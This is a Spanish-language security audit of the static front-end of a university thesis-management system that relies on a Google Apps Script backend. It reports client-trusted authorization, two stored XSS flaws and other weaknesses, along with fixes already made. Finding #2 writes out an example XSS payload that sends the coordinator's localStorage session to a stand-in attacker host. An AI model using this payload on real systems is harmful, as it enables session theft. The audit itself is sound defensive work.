# Auditoría — CTTG Medicina (USC)

Revisión de seguridad, arquitectura y calidad de código del sistema de trabajos de grado.

- **Repositorio:** cttg2
- **Alcance:** las 11 páginas HTML estáticas del front-end (login, radicación, actas, protocolo, sustentación, panel de coordinación)
- **Fuera de alcance:** el backend en Google Apps Script (no está en este repositorio, no pudo revisarse directamente)

## Arquitectura

El sitio no tiene servidor propio: son archivos HTML estáticos que llaman por `fetch` a una URL de **Google Apps Script** (`URL_APP`, repetida en las 11 páginas), la cual lee y escribe en Google Sheets/Drive. Esto significa que **toda la autorización real vive en un código que no está versionado en este repo** — es la pieza de mayor riesgo del sistema y hoy no tiene revisión de código posible.

---

## Hallazgos críticos

### 1. El backend confía en lo que dice el cliente, no en una sesión verificada
El login guarda la respuesta en `localStorage` (`cttg_user` / `cttg_admin`) sin firma ni token. Todas las acciones siguientes (`getFase1`, `updateEstado`, `aprobarActasAsesoria`, `validarTutores`, `actualizarProtocolo`, `updateFase3Asignacion`, `completarFase3`, `subirArchivo`, `getTutores`) solo envían un `email`/`emailCoord` de texto plano, nunca una credencial verificable. Como `URL_APP` es pública por diseño (el navegador debe poder llamarla), si el Apps Script no revalida identidad y rol en cada acción, cualquiera con esa URL puede leer todos los datos de estudiantes/tutores o modificar cualquier registro sin haber iniciado sesión.
**Verificación:** hacer un `POST` a `URL_APP` con `{"action":"getFase1"}` sin sesión previa; si devuelve datos, el hallazgo está confirmado.
**Acción requerida:** revisar el Apps Script y emitir un token de sesión que el servidor valide en cada acción — no se puede corregir desde este repositorio.

### 2. XSS almacenado — `coordinadora_fase3.html:279`
`JSON.stringify(r)` se inyecta directo dentro de un atributo `onclick` entre comillas dobles, escapando solo comillas simples. Un estudiante puede poner en el título de su proyecto algo como `x"><img src=x onerror=fetch('https://atacante.com/x?c='+localStorage.getItem('cttg_admin'))>`; al abrir la coordinadora "Fase 3 → Pendiente Asignación" el script se ejecuta en su sesión, sin necesidad de que haga clic en nada.
**Estado:** ⚠️ pendiente de corregir.

### 3. XSS almacenado — `protocolo_coordinadora.html:166-180`
Construye `tr.innerHTML` con `p.numero`, `p.emailEstudiante`, `p.nombreArchivo`, `p.anexoCambio`, `p.evaluador`, `p.decision` sin la función `esc()` que sí se usa en el resto del sistema. `nombreArchivo` es el nombre real del archivo (`file.name`) que el estudiante sube en `protocolo_fase2.html:163` — basta con nombrar el PDF con HTML malicioso.
**Estado:** ⚠️ pendiente de corregir.

---

## Hallazgos altos

- **Reglas de negocio solo en el navegador**: una radicación activa a la vez, Turnitin < 20%, orden de fases — todo es JS de interfaz, sin equivalente server-side visible. Se salta llamando las acciones directamente.
- **Sesiones sin expiración**: `localStorage` guarda el usuario indefinidamente hasta que alguien pulse "Salir" — riesgo en equipos compartidos.
- **Sin validación real de archivos**: tipo y tamaño (`subirArchivo`) solo se revisan en JavaScript antes de enviar el `base64`.

## Hallazgos medios

- `URL_APP` duplicada 39 veces en 10 archivos — rotarla exige editar cada uno.
- La función `esc()` está copiada en cada página en vez de compartida — exactamente el patrón que causó los hallazgos #2 y #3.
- `actas_asesoria.html` es una pantalla de demostración: no verifica sesión, muestra datos fijos ("Demo Estudiante", "CTTG-2026-0010") y el botón "Ya envié mi acta" nunca llama al backend — el estudiante recibe una confirmación falsa.
- Sin `Content-Security-Policy` en ninguna página.

## Hallazgos menores

- `console.log` de depuración en `estudiante_dashboard.html:474`.
- Parseo de fechas con `new Date(cadena)` dependiente del formato exacto que devuelva Sheets.
- Exportación CSV (`coordinadora_dashboard.html`) con escape mínimo de comillas.

## Lo que ya está bien

- Casi todas las pantallas escapan correctamente los datos dinámicos con `esc()` — la excepción en 2 pantallas es la causa de los críticos, no la norma.
- `coordinadora_validar_tutores.html` valida el parámetro `row` de la URL con `/^\d+$/` antes de usarlo — buen hábito a extender al resto del sistema.
- No se encontraron API keys, contraseñas ni tokens de terceros expuestos en el código.

---

## Corregido en esta revisión (ya en el repo)

- **`coordinadora_validar_tutores.html`** — el formulario de "Validar Tutores" **no reflejaba el vínculo laboral real del tutor**: el campo que llena el estudiante guarda `"Profesor con Vinculo laboral con la USC"` / `"Profesor SIN Vinculo laboral con la USC"`, pero la pantalla de la coordinadora solo reconocía `"Si"`/`"No"` — por eso el Tutor 1 siempre se mostraba como "No" y el Tutor 2 siempre aparecía como "Sin tutor 2" aunque existiera. Se agregó un mapeo (`mapVinculo`) que traduce correctamente los valores.
- **`coordinadora_dashboard.html`** — el filtro de estado "Tutores Avalados" comparaba contra `"Tutores avalados"` (minúscula) mientras que `validarTutores` guarda `"Tutores Avalados"` (mayúscula) — el filtro nunca encontraba resultados. Corregido para que coincidan.

## Pendiente — requiere acceso al Apps Script (prioridad máxima, sin plazo: es ahora)

1. Confirmar si cada acción revalida identidad/rol en servidor o solo confía en el cliente (hallazgo crítico #1).
2. Emitir un token de sesión con expiración real en el login; exigirlo en cada acción posterior.
3. Mover al servidor las reglas hoy solo-cliente (una radicación activa, Turnitin < 20%, orden de fases).
4. Validar tipo/tamaño real de archivo en `subirArchivo`.
5. Poner el código del Apps Script bajo control de versiones para que pueda auditarse y revisarse como el resto del sistema.

## Pendiente — corregible en este repositorio

1. Corregir los dos XSS almacenados (#2 y #3).
2. Quitar el `console.log` de depuración.
3. Decidir qué hacer con `actas_asesoria.html` (conectarla al backend real o dejar explícito que aún no registra nada).
4. Centralizar `URL_APP` y `esc()` en un archivo compartido.
5. Agregar `Content-Security-Policy` básica.
